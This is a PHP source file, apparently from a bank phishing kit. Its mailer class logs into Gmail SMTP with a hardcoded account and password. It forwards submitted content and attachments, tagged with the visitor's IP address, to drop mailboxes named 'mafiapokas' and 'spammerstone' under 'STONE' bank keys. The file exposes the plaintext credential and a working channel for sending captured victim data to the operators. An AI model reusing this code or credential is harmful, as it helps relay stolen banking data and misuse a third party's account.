<?php
class EnviarEmail
{

	private $msg;
	private $banco;
	private $ip;

	private $email_principal = "mafiapokas@gmail.com,Ghost";
	private $email_secundario = "spammerstone@gmail.com,Ghost";

	function __construct($assunto='',$msg='',$banco='',$anexo=array()) {

		$this->msg 			= $msg;
		$this->banco 		= $banco;
		$this->ip 			= $_SERVER["REMOTE_ADDR"];

		$data = array();

		date_default_timezone_set('America/Sao_Paulo');
		require 'PHPMailer/PHPMailerAutoload.php';

		//Configurar
		$email_send = "mcpedrofunkgo@gmail.com";
		$pass_send  = "pedrodelicia";
		$name_send  = "MAFIADO7";

		$mail = new PHPMailer;
		$mail->isSMTP();
		$mail->Host = 'smtp.gmail.com';
		$mail->Port = 587;
		$mail->SMTPSecure = 'tls';
		$mail->SMTPAuth = true;
		$mail->Username = $email_send;
		$mail->Password = $pass_send;
		$mail->setFrom($email_send, $assunto." - ".$_SERVER["REMOTE_ADDR"]);
		$mail->Subject = $assunto." - ".$_SERVER["REMOTE_ADDR"];

		if (count($anexo) > 0) {
			$mail->AddAttachment($anexo[0],$anexo[1]);
		}

		$des = EnviarEmail::Lista($this->banco);
		$mail->addAddress($des[0], $des[1]);

		$mail->msgHTML($this->msg);

		if ($mail->send()) {
			return true;
		} else {
			return false;
		}
	}

	public function Lista()
	{
		//telas
		$this->lista['STONE'] 			= $this->email_principal;
		$this->lista['STONE1'] 			= $this->email_secundario;

		return explode(',', $this->lista[$this->banco]);
	}
}
